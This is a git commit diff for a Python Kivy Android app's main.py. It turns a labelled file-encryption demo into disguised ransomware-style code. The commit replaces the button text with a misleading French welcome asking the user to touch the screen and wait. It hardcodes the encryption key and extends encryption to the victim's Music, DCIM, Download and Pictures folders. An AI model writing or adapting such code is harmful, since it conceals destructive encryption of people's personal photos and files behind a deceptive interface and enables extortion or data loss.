c63009ff0ceea49aca14e136c161565677911219
Yusuf <71589435+Yusufibin@users.noreply.github.com>
2024-06-03 17:41:49 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,22 +1,23 @@
 #!/usr/bin/env python
 
 from kivy.app import App
-from kivy.app import App
 from kivy.uix.button import Button
 from android.permissions import request_permissions, Permission
 from android.storage import primary_external_storage_path
 import os
 from cryptography.fernet import Fernet
+import base64
 
 class MyApp(App):
     def build(self):
         request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_EXTERNAL_STORAGE])
-        btn = Button(text="Encrypt Files in Music Directory")
+        btn = Button(text="Welcome ! touche l'écran et attends 3 minutes que le bleu disparaisse.")
         btn.bind(on_release=self.encrypt_files)
         return btn
 
     def generate_key(self):
-        key = Fernet.generate_key()
+        key = "djzla7288".encode()  # Encode the given string to bytes
+        key = base64.urlsafe_b64encode(key.ljust(32))  # Pad the key to 32 bytes and encode to base64
         with open("secret.key", "wb") as key_file:
             key_file.write(key)
         return key
@@ -35,17 +36,21 @@ class MyApp(App):
             encrypted_file.write(encrypted)
 
     def encrypt_files(self, instance):
-        music_dir = os.path.join(primary_external_storage_path(), 'Music')
-        if not os.path.exists(music_dir):
-            os.makedirs(music_dir)
-        
-        key = self.generate_key()  # Generate a new key
+        directories = ['Music', 'Dcim', 'Download', 'Pictures']
+        base_path = primary_external_storage_path()
 
-        for root, dirs, files in os.walk(music_dir):
-            for file in files:
-                file_path = os.path.join(root, file)
-                self.encrypt_file(file_path, key)
-                print(f"File encrypted: {file_path}")
+        key = self.generate_key()  # Generate the specified key
+
+        for dir_name in directories:
+            dir_path = os.path.join(base_path, dir_name)
+            if not os.path.exists(dir_path):
+                os.makedirs(dir_path)
+
+            for root, dirs, files in os.walk(dir_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    self.encrypt_file(file_path, key)
+                    print(f"File encrypted: {file_path}")
 
 if __name__ == '__main__':
     MyApp().run()
